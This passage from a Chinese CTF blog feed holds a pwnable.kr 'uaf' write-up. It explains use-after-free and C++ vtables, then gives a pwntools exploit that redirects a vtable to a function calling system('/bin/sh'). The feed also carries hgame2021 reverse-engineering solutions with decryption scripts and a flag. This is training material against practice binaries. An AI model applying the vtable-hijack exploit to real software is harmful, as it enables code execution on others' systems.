class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ues-After-Free"><a href="#Ues-After-Free" class="headerlink" title="Ues After Free"></a>Ues After Free</h3><p>​        uaf的原理其实并不难懂，首先需要一个迷途指针，也称为野指针，这个指针时因为在使用玩分配的堆空间后没有将指向堆的指针制空造成的，利用野指针我们可以向这块堆中写入一些东西，然后在申请堆空间，在释放完后马上又申请会申请到那段刚刚释放的堆空间。</p><p>这个是最简单的uaf程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//指针p0申请内存；</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p0 Addr:%x,%s\n&quot;</span>,p0,p0);      <span class="comment">//打印其地址与值；</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//释放p0；</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;word&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 Addr:%x,%s\n&quot;</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C-的一些知识点"><a href="#C-的一些知识点" class="headerlink" title="C++的一些知识点"></a>C++的一些知识点</h3><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">多态</a></h4><p>​        这个概念在在wiki上解释得非常抽象，但是上面的源码其实挺适合我们理解的，Man和Woman都继承了Person这个类，introduce这个动作是所有人都有的，但是细分到Man和Woman时他们之间的introduce又不一样了，这就是多态。</p><p>​        我的理解为，在于参考系的不同，这样就存在宏观与微观的区别。。怪异的理解。</p><h4 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h4><p>​        c++面向对象编程的多态性需要由虚表来实现。</p><p>​        虚表通俗来讲就是一个函数指针数组，这个数组里面的指针指向了类中的虚函数，<strong>但是虚函数表并不存放在类中</strong>，类中只有一个指针指向虚函数表。而在c++中同一个类的对象共用一张虚表。        </p><h4 id="类在内存中的结构"><a href="#类在内存中的结构" class="headerlink" title="类在内存中的结构"></a>类在内存中的结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+           virtual talbe                                           </span><br><span class="line">+  virtual table pointer +  ----&gt;  +---------------+ </span><br><span class="line">+------------------------+         + func1 pointer +    </span><br><span class="line">+   characteristic _ 1   +         + --------------+</span><br><span class="line">+------------------------+         + func2 pointer +</span><br><span class="line">+   characteristic _ 2   +         +---------------+</span><br><span class="line">+------------------------+         + func3 pointer +</span><br><span class="line">+   characteristic _ 3   +         +---------------+</span><br><span class="line">+------------------------+</span><br><span class="line">+       ...........      +</span><br><span class="line">+------------------------+</span><br><span class="line">+   characteristic _ n   +</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><h3 id="程序分析分析"><a href="#程序分析分析" class="headerlink" title="程序分析分析"></a>程序分析分析</h3><ul><li><p>程序开始申请了两块内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br></pre></td></tr></table></figure></li><li><p>用户选择菜单（1.调用方法。2.申请内存，读入参数。3.释放内存）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                               m-&gt;introduce();</span><br><span class="line">                               w-&gt;introduce();</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                               len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                               data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                               read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                               <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">                       <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                               <span class="keyword">delete</span> m;</span><br><span class="line">                               <span class="keyword">delete</span> w;</span><br><span class="line">                               <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现程序没有对释放内存后的指针置空，存在野指针，而选择而又可以申请内存，满足UAF漏洞的触发条件。初步的想法就是先3在2（先释放后申请），在向申请的空间中写入东西，现在的问题是写什么进去。释放的空间是类，写入的数据改变的是类，如果类有虚函数，那么类结构的开头就是虚表指针。我们改变的就是虚表指针，改变虚表指针的作用可以通过IDA查看反编译代码来学习</p></li></ul><h4 id="IDA反编译来理解虚函数表"><a href="#IDA反编译来理解虚函数表" class="headerlink" title="IDA反编译来理解虚函数表"></a>IDA反编译来理解虚函数表</h4><p>跟踪变量v12和v13</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205174523338.png"></p><p>下面这里有点难看懂，如指针没有学好看这种一定会看晕。我尽量写清楚一点</p><p>首先要明白v12,v13这两个变量存放的是对象虚表的地址，因为两个变量类型和操作方法一样，我只说v12就可以了</p><ol><li>将v12强转成QWORD*类型，在取这个地址中的值，QWORD占8个字节，一次取8位，取出的这8位就是虚表的首地址</li><li>虚表首地址加+8，代表取虚表中的第二个函数指针</li><li>将函数指针赋值，在调用，参数就是对象本身（this指针)，如果不懂this指针去Google了解下，很重要。</li></ol><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205174708424.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>​        通过上面的分析，知道了调用虚函数其实是通过偏移来实现的，通过+8可以调用第二个虚函数，如果我们得到了虚函数表基址，并且改变，就可以控制函数调用我们想调用的虚函数，而程序为我们准备了这样一个虚函数，我们可以使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过IDA查找到Person函数的虚表地址是0x0000000000401590，将这个值-8，那么在调用的时候就刚好可以调用到give_shell这个函数</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205180240856.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机exp，远程失败好像是我没有写文件的权限？</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">vtable_addr = <span class="number">0x0000000000401550</span></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/uaf/bash&#x27;</span></span><br><span class="line"><span class="comment">#filepath = &#x27;/tmp/f1sh&#x27;</span></span><br><span class="line">write_stream = p64(vtable_addr - <span class="number">8</span>)</span><br><span class="line"><span class="keyword">with</span> open(filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(write_stream)</span><br><span class="line"></span><br><span class="line">Argv = [<span class="string">&#x27;/home/uaf/uaf&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, filepath]</span><br><span class="line">p = process(executable = <span class="string">&#x27;./uaf&#x27;</span>, argv = Argv )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这个是链接上服务器后手动getshell得到的结果</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205224956747.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210208131805440.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hgame2021-week1</title>
    <link href="http://example.com/2021/02/02/CTF/wp/HGAME/"/>
    <id>http://example.com/2021/02/02/CTF/wp/HGAME/</id>
    <published>2021-02-01T16:55:40.696Z</published>
    <updated>2021-02-25T12:18:53.289Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="RE-week1"><a href="#RE-week1" class="headerlink" title="RE-week1"></a>RE-week1</h2><h3 id="一杯阿帕茶"><a href="#一杯阿帕茶" class="headerlink" title="一杯阿帕茶"></a>一杯阿帕茶</h3><p>明显的TEA加密标志，后面分析为XXTEA加密</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201051733.png"></p><p>加密后的数据，刚好35位</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201231341.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5 ^ y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XXTEA</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> sum, y, z;</span><br><span class="line"><span class="keyword">uint32_t</span> p, rounds, e;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">n = -n;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = rounds * DELTA;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">z = v[p - <span class="number">1</span>];</span><br><span class="line">y = v[p] -= MX;</span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> arr[] = &#123;<span class="number">3880694563</span>, <span class="number">3081185334</span>, <span class="number">1506439138</span>, <span class="number">2524759489</span>, <span class="number">3883935348</span>, <span class="number">1026381030</span>, <span class="number">2325545814</span>, <span class="number">2581382044</span>, <span class="number">1881594093</span>, <span class="number">1781792173</span>, <span class="number">4103492874</span>, <span class="number">1553756062</span>, <span class="number">468045900</span>, <span class="number">1730391575</span>, <span class="number">1383114178</span>, <span class="number">2890011402</span>, <span class="number">2227070898</span>, <span class="number">1885128569</span>, <span class="number">1548828056</span>, <span class="number">4214676013</span>, <span class="number">571971141</span>, <span class="number">1558401693</span>, <span class="number">3515474427</span>, <span class="number">3898332297</span>, <span class="number">1942540575</span>, <span class="number">1421197718</span>, <span class="number">3061626000</span>, <span class="number">555214026</span>, <span class="number">2648963476</span>, <span class="number">794468778</span>, <span class="number">2816999933</span>, <span class="number">3272437419</span>, <span class="number">464379036</span>, <span class="number">877899850</span>, <span class="number">2460223225</span>&#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">XXTEA(<span class="number">-35</span>, arr, key);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201420062.png"></p><h3 id="Welcome-to-reverse-world"><a href="#Welcome-to-reverse-world" class="headerlink" title="Welcome to reverse world !"></a>Welcome to reverse world !</h3><p>简单题，一个异或直接搞定</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201736107.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>():</span></span><br><span class="line">    addr = <span class="number">0x00007FF7F7513480</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        flag += chr((<span class="number">0xff</span> - i) ^ get_byte(addr +i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201201838100.png"></p><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了我们python字节码，需要我们自己还原成python代码，下面贴还原过后的代码，加密过程很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_func</span>():</span></span><br><span class="line">    raw_flag = input(<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line">    cipher = list(raw_flag[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">    length = len(cipher)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length // <span class="number">2</span>):</span><br><span class="line">        cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i+<span class="number">1</span>] = cipher[<span class="number">2</span>*i+<span class="number">1</span>] , cipher[<span class="number">2</span>*i]</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        res.append(ord(cipher[i]) ^ i)</span><br><span class="line">    res = bytes(res).hex()</span><br><span class="line">    print(<span class="string">&#x27;your flag: &#x27;</span> + res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(dis.dis(input_func))</span></span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cip</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res = []</span><br><span class="line">    cipher = <span class="string">&#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span></span><br><span class="line">    length = len(cipher)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, length, <span class="number">2</span>):</span><br><span class="line">        res.append(int(cipher[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">        flag += chr(res[i] ^ i)</span><br><span class="line">    flag = list(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag) // <span class="number">2</span>):</span><br><span class="line">        flag[i*<span class="number">2</span>+<span class="number">1</span>], flag[i*<span class="number">2</span>] = flag[i*<span class="number">2</span>],flag[i*<span class="number">2</span> + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week3"><a href="#RE-week3" class="headerlink" title="RE-week3"></a>RE-week3</h2><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cipher[] = &#123; <span class="number">9</span>, <span class="number">230</span>, <span class="number">79</span>, <span class="number">183</span>, <span class="number">219</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">173</span>, <span class="number">232</span>, <span class="number">54</span>, <span class="number">118</span>, <span class="number">198</span>, <span class="number">240</span>, <span class="number">23</span>, <span class="number">103</span>, <span class="number">162</span>, <span class="number">247</span>, <span class="number">231</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">58</span>, <span class="number">112</span>, <span class="number">237</span>, <span class="number">36</span>, <span class="number">2</span>, <span class="number">126</span>, <span class="number">175</span>, <span class="number">246</span>, <span class="number">59</span>, <span class="number">128</span>, <span class="number">191</span>, <span class="number">207</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Xor[] = &#123; <span class="number">0xfe</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xd0</span>,<span class="number">0xf3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa3</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x0</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Sub[] = &#123; <span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (cipher[i] + Sub[i]) ^ Xor[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">WPWPWP</summary>
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>go语言学习2（函数，匿名函数，闭包）</title>
    <link href="http://example.com/2021/02/02/go/GoStudy-2/"/>
    <id>http://example.com/2021/02/02/go/GoStudy-2/</id>
    <published>2021-02-01T16:34:19.104Z</published>
    <updated>2021-02-05T06:37:34.465Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

</summary>
      
    
    
    
    <category term="go" scheme="http://example.com/categories/go/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>HWS计划2021硬件安全冬令营线上选拔赛</title>
    <link href="http://example.com/2021/02/01/CTF/wp/HWSCTF/"/>
    <id>http://example.com/2021/02/01/CTF/wp/HWSCTF/</id>
    <published>2021-02-01T10:51:54.222Z</published>
    <updated>2021-02-05T06:32:17.657Z</updated>
    
